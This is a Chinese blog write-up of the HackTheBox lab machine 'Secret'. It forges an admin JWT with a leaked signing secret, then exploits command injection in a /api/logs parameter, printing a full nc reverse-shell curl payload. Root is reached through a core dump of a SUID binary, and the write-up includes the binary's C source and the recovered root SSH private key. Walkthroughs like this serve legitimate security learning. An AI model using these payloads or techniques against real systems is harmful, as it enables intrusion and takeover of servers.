---
title: Secret
date: 2022-01-18 14:07:16
tags: HackThebox
categories: 代码审计
---

## 信息收集
发现目标主机开放了web服务和ssh服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/bcfdfdf3f8f34f54b9cef39a2bfd9e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们访问web服务，发现是一个普通的网站
![在这里插入图片描述](https://img-blog.csdnimg.cn/ebaa1c867d244570a8bbaee74355eb78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

探测路径并没有发现任何有价值的信息，我们将源码下载下来进行代码审计。在routes文件夹下，有4个js文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/9819cf6cb2214d76bce1c74ff577d39e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们查看一下auth.js文件

```javascript
const router = require('express').Router();
const User = require('../model/user');
const bcrypt = require('bcryptjs')
const jwt = require('jsonwebtoken')
const { registerValidation, loginValidation} = require('../validations')

router.post('/register', async (req, res) => {

    // validation
    const { error } = registerValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if user exists
    const emailExist = await User.findOne({email:req.body.email})
    if (emailExist) return res.status(400).send('Email already Exist')

    // check if user name exist 
    const unameexist = await User.findOne({ name: req.body.name })
    if (unameexist) return res.status(400).send('Name already Exist')

    //hash the password
    const salt = await bcrypt.genSalt(10);
    const hashPaswrod = await bcrypt.hash(req.body.password, salt)


    //create a user 
    const user = new User({
        name: req.body.name,
        email: req.body.email,
        password:hashPaswrod
    });

    try{
        const saveduser = await user.save();
        res.send({ user: user.name})
    
    }
    catch(err){
        console.log(err)
    }

});


// login 

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});

module.exports = router
```
<!--more-->

看到源代码后，不难理解其逻辑，程序的逻辑就是先要注册用户，并检查邮件和用户名是否存在，并将密码进行加密。然后程序跳转到登录页面，登录页面查看用户输入的邮件名和密码是否正确，并生成一个jwt的token值发送给用户。

auth.js文件的逻辑理解完之后，我们再审计`private.js`这个js文件，这个文件是去判断我们当前用户是否是管理员，如果是管理员，那么就返回一个属于管理员的token值给我们。logs目录的作用我们后面在阐述。

```javascript
const router = require('express').Router();
const verifytoken = require('./verifytoken')
const User = require('../model/user');

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})


router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});


module.exports = router

```
## 漏洞利用
那么我们可以先跟着程序的逻辑走，先注册一个用户，我们使用curl命令进行注册

```bash
curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "pyhpyh","email":"pyhpyh@pyhpyh.com","password":"123456"}'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6877b34ccd48456899c6406694b4a3c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
注册成功后我们尝试登录，获取到对应的一个jwt的json值

```bash
curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{"email": "pyhpyh@pyhpyh.com","password":"123456"}'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/aafa956f479941fbbeab98630d01d38f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们拿到`jwt.io`这个网站上进行解密，可以看到如下的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/179ef353a19343508cdd7f441865168d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们以这个token值去请求`priv`页面时，页面返回的是json内容给我们，表名我们当前还是一个普通用户

```bash
curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU1OTEwNTQ4OTBkMzA0NWZiZGVjZTkiLCJuYW1lIjoicHlocHloIiwiZW1haWwiOiJweWhweWhAcHlocHloLmNvbSIsImlhdCI6MTY0MjQzNDk3MX0.a0IawKMSfT6K0c3MnpLFUG9DdzBGETBaBidIVvI232k'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4ffd7b07f06341bc9e474824e0ab7497.png)
那么我们这里就可以使用越权的方式进行对我们当前用户的权限进行提升。首先我们先获取到网站本身对应的`TOKEN_SECRET`值`gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`
![在这里插入图片描述](https://img-blog.csdnimg.cn/fbbb692d50744c04b07e88f1794b5a28.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这里有两种方式可以获取到`theadmin`的token值，第一种方式是直接在jwt.io网站上获取，另一种是借助github上的开源工具，两种方法都是可行的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/8d4fa1ca097b4af88ba2fa45fb58e16f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7e6f80cc46fb4cd295778db414ecac66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
token改变完成后，我们再进行请求，验证我们的token是否有效，结果是成功的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/a1f94aca92f3429c9a9f6a60702f9b5f.png)
第二种方法就是，利用jwt_tools这个工具直接生成一个有效的theadmin对应的token值。`-I`参数是指更改现有的jwt_token值，`-S`是指加密的方式，`-pc`是设置payload的对应字段名，`-pv`是payload对应的字段值，`-p`是指密码

```bash
python3 jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoicHlocHloIiwiZW1haWwiOiJweWhweWhAcHlocHloLmNvbSIsImlhdCI6MTY0MjQ3NDY0Mn0.veoEcejKaj-TjQuBu63pwJmyaU1hzx3qV7GgQkbZ6R4
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/84147fa8af0e48feb62f092514fda485.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
至此，我们虽然是得到了admin的token令牌，但是我们还得找到可以利用的点。在审计private.js文件时，发现了logs目录，这个目录后面要传入一个files参数，这个参数执行的条件恰巧就是必须得以管理员的权限运行，并且是以命令的形式执行，那这里就可能存在RCE漏洞了。我们简单检验了一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/3986f4c8d6c741c3a586b085150d2916.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16)

```bash
curl 'http://secret.htb/api/logs?file=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2227afbf6fb649e681f1a9da5e9bd06c.png)
从这个现象上看，有点类似于命令注入漏洞。我们稍微更改一下参数变量的值

```bash
curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/39cd1b3ae0744ea783b6dfe4775a5e43.png)
那我们就可以反弹一个shell到本地终端上了

```bash
curl 'http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%2010.10.14.26%204444%20%3E%2Ftmp%2Ff' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/91a92e66d3d8430b83ab8c3b7f961162.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/22ae641b17d34a9eaab0ac356d0e3032.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们首先查找具有执行权限的文件，引起我注意的是`/opt/count`这个文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/e850dd03ff7d47fbb92504de53f3bfc7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
进入opt目录后，发现存在一个`code.c`文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/1148c32238e347d6a410e8666df9bb43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```
上述代码是指在代码中启用核心转储，这有助于分析崩溃转储，因此我们需要获取两个shell，具体参考资料[https://man7.org/linux/man-pages/man2/prctl.2.html](https://man7.org/linux/man-pages/man2/prctl.2.html)。我们首先先运行这个count文件，并输入相对应的参数值，目的是获取到root的ssh密钥
![在这里插入图片描述](https://img-blog.csdnimg.cn/646aaa231c9849b0b991774b4b2542ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们在另一个终端上结束这个进程，它会生成一个日志文件。通过使用 apport-unpack 我们可以轻松调试程序的崩溃。所有的崩溃数据都存储在转储目录下，CoreDump 有我们需要的信息。
![在这里插入图片描述](https://img-blog.csdnimg.cn/12396e7ff8884666860801df4d99273f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1
xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx
8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu
BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2
5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y
Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2
EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr
85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65
rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob
0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde
+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT
uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg
BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP
Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3
t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997
44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq
Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3
4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv
D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF
JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z
y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA
wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81
ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o
Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM
dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh
mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4
Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep
lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc
z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9
RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9
6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl
xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
我们拿到ssh的root密钥后，就可以尝试连接root用户了
![在这里插入图片描述](https://img-blog.csdnimg.cn/b2efd44d61e04cbfad3fe15f865131fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 总结
这个靶机还是相当出色的一个靶机，它主要考查了代码审计的能力，代码包含了js，c这些高级的编程语言，前期拿取webshell主要考查了js前端的代码审计能力，后期提权是核心转储，这个要求真的很高了，这个靶机我觉得应该设置为Medium难度，但是它确实Easy，有点意外。
